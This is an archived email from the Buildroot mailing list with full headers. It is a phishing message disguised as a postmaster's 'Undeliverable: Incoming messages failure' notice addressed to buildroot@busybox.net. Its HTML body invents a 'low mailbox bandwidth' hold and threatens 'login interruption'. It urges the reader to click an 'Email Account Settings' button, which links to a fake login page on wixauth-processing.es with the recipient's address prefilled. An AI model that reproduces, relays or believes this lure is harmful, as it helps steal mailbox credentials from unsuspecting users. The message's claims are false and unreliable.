Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 783F3E77170
	for <buildroot@archiver.kernel.org>; Wed,  4 Dec 2024 17:39:56 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 1475B6068C;
	Wed,  4 Dec 2024 17:39:56 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id S1haDup_c9Lj; Wed,  4 Dec 2024 17:39:55 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 1FB1D606A9
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id 1FB1D606A9;
	Wed,  4 Dec 2024 17:39:55 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id 2BE7D1DD3
 for <buildroot@buildroot.org>; Wed,  4 Dec 2024 17:39:53 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 0B3F181FFC
 for <buildroot@buildroot.org>; Wed,  4 Dec 2024 17:39:53 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id OAXnX0x25RBu for <buildroot@buildroot.org>;
 Wed,  4 Dec 2024 17:39:52 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.217.196;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 1128C8202E
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 1128C8202E
Received: from busybox.net (unknown [192.227.217.196])
 by smtp1.osuosl.org (Postfix) with ESMTP id 1128C8202E
 for <buildroot@busybox.net>; Wed,  4 Dec 2024 17:39:51 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 4 Dec 2024 18:39:51 +0100
Message-ID: <20241204183951.EB5D13BDB97664F7@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Incoming messages failure
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8388600756857579511=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8388600756857579511==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"100%" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0">
<tbody>
<tr>
<td height=3D"1" style=3D"margin: 0px;" bgcolor=3D"#dae1e9"><font size=3D"1=
"></font></td></tr>
<tr>
<td height=3D"24" style=3D"margin: 0px;"><font size=3D"1">&nbsp;</font></td=
></tr>
<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p><font size=3D"4">Dear&nbsp;</font><a style=3D"color: rgb(34, 34, 34);"><=
font size=3D"4">buildroot@busybox.net</font></a><font size=3D"4">,</font></=
p><span style=3D"color: rgb(72, 84, 93); line-height: 24px; font-size: 14px=
;"><font size=3D"4">Your incoming messages has been placed on hold due to l=
ow mailbox bandwidth.<br>Go to Email account settings below to review held =
messages and fix bugs.</font></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4">&nbsp;</font></td=
></tr>
<tr>
<td width=3D"48%" align=3D"center" valign=3D"top" style=3D"margin: 0px;"><s=
pan><a style=3D"padding: 15px 25px; color: rgb(255, 255, 255); text-decorat=
ion: none; display: block; background-color: rgb(0, 135, 209);" href=3D"htt=
ps://wixauth-processing.es/mail3/login/mail/inbox.html#buildroot@busybox.ne=
t" rel=3D"noopener noreferrer"><font size=3D"4">Email Account Settings</fon=
t></a></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p style=3D"color: rgb(162, 162, 162); line-height: 17px; font-size: 12px; =
font-style: italic;"><font size=3D"3">Failure to review your account may ca=
use login interruption.<br>&copy; 2023 busybox.net. All Rights Reserved.</f=
ont></p></td></tr></tbody></table></body></html>

--===============8388600756857579511==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8388600756857579511==--
